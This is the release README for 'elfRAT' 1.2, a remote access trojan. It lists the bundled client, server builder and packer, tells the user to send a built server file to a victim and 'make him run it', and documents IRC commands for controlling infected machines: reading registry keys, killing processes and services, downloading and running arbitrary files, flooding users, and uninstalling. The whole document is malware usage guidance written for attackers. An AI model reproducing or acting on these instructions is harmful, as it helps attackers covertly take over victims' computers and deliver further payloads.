    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ RELEASE INFORMATION                                            │
    └─────────────────────────────────────────────────────────────────────┘

      Project : elfRAT
      Version : 1.2
      Coder   : [ELF]HelioS
      Site    : http://users.skynet.be/HelioS/Main
      Note    : first public release and still beta


    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ INCLUDED FILES                                                 │
    └─────────────────────────────────────────────────────────────────────┘

      ReadMe.txt                   (This File)
      Client-v1.2.exe              (to connect to victim)
      EditServer-v1.2.exe          (to create a new server file)
      Server.dat                   (needed by editserver)
      elfIcon.dll                  (needed by editserver)
      upx.exe                      (to make server smaller)
      elfJPG.dll                   (plugin to compress bmp to jpg)


    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ HOW TO USE                                                     │
    └─────────────────────────────────────────────────────────────────────┘

      Make a new "server" using editserver
      Send that newly created file to your victim and make him run it
      use the client to connect to him if you get his ip by one of the notifiers
 

    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ IRC NOTIFIER COMMANDS                                          │
    └─────────────────────────────────────────────────────────────────────┘


      !login;<password>                    login as master/admin to the server
      !logout                              logout as master/admin

      !getversion                          server will report the server version
      !getip                               server will report the victims ip
      !connect;<ip>;<port>                 server will connect to the ip and port where
                                           a client is listening on

      !quit                                makes the server quit
      !end                                 makes the server end
      !uninstall                           makes the server uninstall itself

      !getreg;<fullregistrykeyname>        server will report the value of that reg key
      !raw;<rawirccommand>                 server will send a raw irc command to the irc server
      !kill;<exename>                      server will try to close the given exe
      !killservice;<servicename>           server will try to close the given service
      !reroute                             server will rerout all messages in channel and 
                                           private message to his master
      !downloadrun;<url>                   server will download a file from the internet
                                           and open/run it
      !flood;<ircuser>,<times>;<message>   server will message the ircuser
      !free                                server will allow anybody to execute server commands
                                           not only the master/admin
      !reconnect                           server will reconnect to the irc server
      !set;...                             server will update his settings
          ;nick;<newircname>
          ;channel;<newircchannel>
          ;server;<newircserver>
          ;pass;<newpassword>
          ;icq;<newicqnumber>
             

    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ KNOWN BUGS                                                     │
    └─────────────────────────────────────────────────────────────────────┘

      None
      

    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ CONTACT INFORMATION                                            │
    └─────────────────────────────────────────────────────────────────────┘
    
      Report bugs too helios@elfownsyou.be


    ┌─────────────────────────────────────────────────────────────────────┐
    │ ░▒▓█ THANKS GO OUT TO                                               │
    └─────────────────────────────────────────────────────────────────────┘

      [ELF] Team : WE R0X0R Y00 B0X0RS

